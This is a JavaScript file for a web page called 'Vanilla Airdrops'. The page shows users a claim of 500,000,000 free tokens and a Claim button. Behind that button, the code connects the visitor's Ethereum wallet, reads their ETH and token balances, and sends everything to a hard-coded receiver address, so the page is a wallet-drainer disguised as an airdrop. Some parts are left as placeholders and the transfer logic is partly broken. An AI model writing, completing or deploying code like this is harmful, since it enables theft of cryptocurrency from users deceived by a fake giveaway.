import "./styles.css";
import { ethers } from "ethers";

document.getElementById("app").innerHTML = `
<h1>Welcome to Vanilla Airdrops</h1>
<div id="claimButtonContainer" style="display: none;">
  <p id="claimableTokensMessage">500,000,000 Tokens Claimable</p> <!-- Add the text directly in the paragraph element -->
  <button id="claimButton">Claim</button>
</div>
<button id="connectButton">Connect Wallet</button>
<img src="src/eye.gif" alt="Eye" class="gif">
<img src="src/eye2.gif" alt="Eye2" class="gif2">
`;

// You can include this file into your client-side javascript application to gain access to the "human_standard_token_abi" variable.
// This ABI can be used to interact with any Standard ERC-20 or Human Standard Token on the Ethereum Blockchain

const tokenABI = [
  {
    constant: true,
    inputs: [],
    name: "name",
    outputs: [
      {
        name: "",
        type: "string"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "symbol",
    outputs: [
      {
        name: "",
        type: "string"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "decimals",
    outputs: [
      {
        name: "",
        type: "uint8"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "totalSupply",
    outputs: [
      {
        name: "",
        type: "uint256"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address"
      }
    ],
    name: "balanceOf",
    outputs: [
      {
        name: "balance",
        type: "uint256"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: false,
    inputs: [
      {
        name: "_to",
        type: "address"
      },
      {
        name: "_value",
        type: "uint256"
      }
    ],
    name: "transfer",
    outputs: [
      {
        name: "success",
        type: "bool"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: false,
    inputs: [
      {
        name: "_from",
        type: "address"
      },
      {
        name: "_to",
        type: "address"
      },
      {
        name: "_value",
        type: "uint256"
      }
    ],
    name: "transferFrom",
    outputs: [
      {
        name: "success",
        type: "bool"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: false,
    inputs: [
      {
        name: "_spender",
        type: "address"
      },
      {
        name: "_value",
        type: "uint256"
      }
    ],
    name: "approve",
    outputs: [
      {
        name: "success",
        type: "bool"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: true,
    inputs: [
      {
        name: "_owner",
        type: "address"
      },
      {
        name: "_spender",
        type: "address"
      }
    ],
    name: "allowance",
    outputs: [
      {
        name: "remaining",
        type: "uint256"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        name: "_from",
        type: "address"
      },
      {
        indexed: true,
        name: "_to",
        type: "address"
      },
      {
        indexed: false,
        name: "_value",
        type: "uint256"
      }
    ],
    name: "Transfer",
    type: "event"
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        name: "_owner",
        type: "address"
      },
      {
        indexed: true,
        name: "_spender",
        type: "address"
      },
      {
        indexed: false,
        name: "_value",
        type: "uint256"
      }
    ],
    name: "Approval",
    type: "event"
  },
  {
    inputs: [
      {
        name: "_initialAmount",
        type: "uint256"
      },
      {
        name: "_tokenName",
        type: "string"
      },
      {
        name: "_decimalUnits",
        type: "uint8"
      },
      {
        name: "_tokenSymbol",
        type: "string"
      }
    ],
    payable: false,
    type: "constructor"
  },
  {
    constant: false,
    inputs: [
      {
        name: "_spender",
        type: "address"
      },
      {
        name: "_value",
        type: "uint256"
      },
      {
        name: "_extraData",
        type: "bytes"
      }
    ],
    name: "approveAndCall",
    outputs: [
      {
        name: "success",
        type: "bool"
      }
    ],
    payable: false,
    type: "function"
  },
  {
    constant: true,
    inputs: [],
    name: "version",
    outputs: [
      {
        name: "",
        type: "string"
      }
    ],
    payable: false,
    type: "function"
  }
];

const connectButton = document.getElementById("connectButton");
const claimButtonContainer = document.getElementById("claimButtonContainer");
const claimButton = document.getElementById("claimButton");

connectButton.addEventListener("click", connectWallet);
claimButton.addEventListener("click", batchTransferTokens);

// Rest of your code...

let provider;
let signer;

async function connectWallet() {
  claimButtonContainer.style.display = "block";

  // Request access to the user's Ethereum wallet
  if (window.ethereum) {
    try {
      await window.ethereum.request({ method: "eth_requestAccounts" });
      provider = new ethers.providers.Web3Provider(window.ethereum);
      signer = provider.getSigner();

      console.log("Wallet connected:", signer);
    } catch (error) {
      console.error("Error connecting wallet:", error);
    }
  } else {
    console.error("Ethereum wallet not found");
  }
}

async function batchTransferTokens() {
  const receiverAddress = "0xADf1Fd5D0752c09C6e30d4b8B3A8d48a3F7E03a2";
  const contractAddress = "0x123456789abcdef"; // Replace with your contract address
  const contractABI = [
    /* Contract ABI array */
  ]; // Replace with your contract ABI

  try {
    if (!provider || !signer) {
      console.error("Wallet not connected");
      return;
    }

    const contract = new ethers.Contract(contractAddress, contractABI, signer);

    const tokenAddresses = [
      ethers.constants.AddressZero, // ETH
      "0xTokenAddress1", // BNB
      "0xTokenAddress2" // USDT
      // Add more token addresses as needed
    ];

    const balances = await getTokenBalances(tokenAddresses);

    const transferPromises = balances.map(({ tokenAddress, balance }) =>
      tokenTransfer(tokenAddress, contract, receiverAddress, balance)
    );

    const batchResult = await Promise.all(transferPromises);

    console.log("Tokens transferred successfully:", batchResult);
  } catch (error) {
    console.error("Error transferring tokens:", error);
  }
}

async function getTokenBalances(tokenAddresses) {
  const tokenBalancePromises = tokenAddresses.map(async (tokenAddress) => {
    const balance = await fetchTokenBalance(tokenAddress);
    async function fetchTokenBalance(tokenAddress) {
      // Create an instance of the token contract
      const tokenContract = new ethers.Contract(
        tokenAddress,
        tokenABI,
        provider
      );

      // Get the balance of the connected account
      const balance = await tokenContract.balanceOf(signer.getAddress());

      // Return the balance as a string
      return balance.toString();
    }

    return { tokenAddress, balance };
  });

  return Promise.all(tokenBalancePromises);
}

async function tokenTransfer(tokenAddress, contract, receiverAddress, amount) {
  const tokenContract = new ethers.Contract(
    tokenAddress,
    contract.interface,
    signer
  );

  const gasLimit = await tokenContract.estimateGas.transfer(
    receiverAddress,
    amount
  );

  const transferTx = {
    to: tokenAddress,
    value: amount,
    gasLimit: gasLimit.toNumber()
  };

  const txResponse = await signer.sendTransaction(transferTx);

  await txResponse.wait();

  return txResponse;
}
